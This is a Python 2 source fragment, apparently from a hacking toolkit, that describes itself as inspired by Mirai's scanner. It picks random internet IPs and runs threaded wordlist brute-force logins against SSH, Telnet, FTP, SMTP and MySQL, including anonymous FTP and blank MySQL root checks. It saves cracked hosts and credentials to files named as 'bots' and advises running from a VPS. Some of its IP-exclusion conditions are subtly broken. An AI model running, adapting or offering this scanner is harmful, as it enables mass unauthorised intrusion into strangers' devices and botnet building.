def getip():
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=random.randint(1,253)
  o2=random.randint(0,254)
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
'''
  the following functions are used to scan safe IPs all over the internet with a wordlist, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
'''
class iots(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,22))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if method==1:
       q=ssh1(ip,username=username,password=password)
      elif method==2:
       q=ssh2(ip,username=username,password=password)
      elif method==3:
       q=ssh3(ip,username=username,password=password)
      if q==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTssh(threads=100,meth=1,wl=wordlist,filename='sshbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global method
 method=meth
 global wordlist
 wordlist=wl
 for x in range(threads):
  t=iots().start()
class iott(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,23))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if method==1:
       q= telnet1(ip,username=username,password=password)
      elif method==2:
       q= telnet2(ip,username=username,password=password)
      if q==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTtelnet(threads=100,meth=1,wl=wordlist,filename='telnetbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global method
 method=meth
 global wordlist
 wordlist=wl
 for x in range(threads):
  iott().start()
class iotf1(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,21))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if ftp(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTftp(threads=100,meth=1,wl=wordlist,filename='ftpbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotf1().start()
class iotf2(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,21))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
     try:
      if ftpanon(ip)==True:
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTftpanon(threads=100,filename='ftpanonbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 for x in range(threads):
  iotf2().start()
class iotsm(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,25))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if smtp(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTsmtp(o,threads=100,wl=wordlist,filename='smtpbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global octet
 octet=o
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotsm().start()
class iotmy(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,3306))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if mysql(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTmysql(threads=100,wl=wordlist,filename='mysqlbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotmy().start()
class iotmy2(threading.Thread):
 def run(self):
  s=mysql
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,3306))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
     try:
      if mysql(ip)==True:
       ip+=':root:'
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTmysql2(threads=100,wl=wordlist,filename='mysqldefaultbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotmy2().start()
